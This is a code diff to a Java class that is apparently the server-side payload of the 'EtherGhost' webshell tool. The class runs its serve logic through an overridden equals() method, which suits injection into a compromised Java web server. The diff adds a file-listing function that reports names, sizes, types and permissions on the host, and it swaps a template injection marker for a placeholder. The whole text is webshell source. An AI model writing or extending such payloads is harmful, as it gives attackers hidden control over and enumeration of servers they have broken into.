@@ -1,14 +1,28 @@
 import java.io.BufferedReader;
+import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.lang.reflect.Method;
 import java.nio.charset.Charset;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.nio.file.attribute.PosixFilePermission;
+import java.nio.file.attribute.PosixFilePermissions;
 import java.util.*;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
 public class Payload {
+    // public static void main(String args[]) {
+    //     Payload payload = (new Payload());
+    //     Object result = payload.listFiles("./");
+    //     StringBuilder sb = new StringBuilder();
+    //     payload.jsonEncodeObject(sb, result);
+    //     System.out.println(sb.toString());
+    // }
+
     public boolean equals(Object obj) {
         try {
             serve(obj);
@@ -41,6 +55,8 @@ public class Payload {
             jsonEncodeString(sb, (String) o);
         } else if (o instanceof Integer) {
             jsonEncodeInteger(sb, (Integer) o);
+        } else if (o instanceof Long) {
+            jsonEncodeInteger(sb, ((Long) o).intValue());
         } else if (o instanceof ArrayList) {
             jsonEncodeList(sb, (ArrayList) o);
         } else if (o instanceof HashMap) {
@@ -133,6 +149,51 @@ public class Payload {
         return result;
     }
 
+    public static ArrayList<Map<String, Object>> listFiles(String dirPath) {
+        ArrayList<Map<String, Object>> result = new ArrayList<>();
+        File dir = new File(dirPath);
+        if (dir.isDirectory()) {
+            for (File file : dir.listFiles()) {
+                String fileName = file.getName();
+                String fileType = getFileType(file);
+                long fileSize = file.length();
+                String filePermission = getFilePermission(file);
+                Map<String, Object> item = new HashMap<>();
+                item.put("name", fileName);
+                item.put("permission", filePermission);
+                item.put("filesize", fileSize);
+                item.put("entry_type", fileType);
+                result.add(item);
+            }
+        }
+        return result;
+    }
+
+    private static String getFileType(File file) {
+        String type = "";
+        if (file.isFile()) {
+            type = "file";
+        } else if (file.isDirectory()) {
+            type = "dir";
+        } else {
+            return "unknown";
+        }
+        if (Files.isSymbolicLink(file.toPath())) {
+            type = "link-" + type;
+        }
+        return type;
+    }
+
+    private static String getFilePermission(File file) {
+        Path path = Paths.get(file.getAbsolutePath());
+        try {
+            Set<PosixFilePermission> perms = Files.getPosixFilePermissions(path);
+            return PosixFilePermissions.toString(perms);
+        } catch (Exception e) {
+            return "---------";
+        }
+    }
+
     public HashMap<String, Object> ping() {
         HashMap<String, Object> map = new HashMap<>();
         map.put("name", "EtherGhost JSP");
@@ -152,7 +213,7 @@ public class Payload {
         HashMap<String, Object> map = new HashMap<>();
         map.put("code", 0);
         try {
-            Object data = ETHER_GHOST_REPLACE_HERE
+            Object data = "replace me"; // ETHER_GHOST_REPLACE_HERE
             map.put("data", data);
         } catch (Exception e) {
             map.put("code", -100);
